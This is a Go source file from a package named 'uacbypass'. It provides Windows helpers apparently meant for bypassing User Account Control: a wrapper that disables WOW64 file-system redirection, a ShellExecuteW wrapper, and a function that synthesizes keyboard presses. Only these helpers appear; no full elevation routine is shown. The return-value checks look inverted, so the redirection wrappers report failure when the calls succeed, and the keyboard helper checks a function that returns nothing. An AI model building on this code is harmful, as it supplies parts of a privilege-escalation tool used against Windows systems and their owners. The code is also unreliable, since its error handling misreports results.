package uacbypass

import (
	"errors"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	shell32                       = syscall.NewLazyDLL("shell32.dll")
	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
	user32                        = syscall.NewLazyDLL("user32.dll")
	procKeyBdEvent                = user32.NewProc("keybd_event")
	procWow64DisableFsRedirection = kernel32.NewProc("Wow64DisableWow64FsRedirection")
	procWow64RevertFsRedirection  = kernel32.NewProc("Wow64RevertWow64FsRedirection")
	procShellExecute              = shell32.NewProc("ShellExecuteW")
)

func WithFsr(f func()) error {
	if f == nil {
		return errors.New("nullable function provided")
	}
	var oldWow64Fsr uintptr
	if ret, _, _ := procWow64DisableFsRedirection.Call(uintptr(unsafe.Pointer(&oldWow64Fsr))); ret != 0 {
		return errors.New("cannot execute Wow64DisableWow64FsRedirection")
	}
	f() // execute
	if ret, _, _ := procWow64RevertFsRedirection.Call(uintptr(oldWow64Fsr)); ret != 0 {
		return errors.New("cannot execute Wow64RevertWow64FsRedirection")
	}
	return nil
}

func ShellExecute(lpFile, lpOperation, lpParameters string, lpFlags int32) error {
	var f16 *uint16
	var o16 *uint16
	var p16 *uint16
	if len(lpFile) > 0 {
		f16, _ = windows.UTF16PtrFromString(lpFile)
	}
	if len(lpOperation) > 0 {
		o16, _ = windows.UTF16PtrFromString(lpOperation)
	}
	if len(lpParameters) > 0 {
		p16, _ = windows.UTF16PtrFromString(lpParameters)
	}
	err := windows.ShellExecute(0, o16, f16, p16, nil, lpFlags)
	return err
}

func KeybdEvent(v0, v1, v2, v3 int32) error {
	ret, _, _ := procKeyBdEvent.Call(uintptr(v0), uintptr(v1), uintptr(v2), uintptr(v3))
	if ret != 0 {
		return errors.New("cannot press keyboard events with keybd_event")
	}
	return nil
}
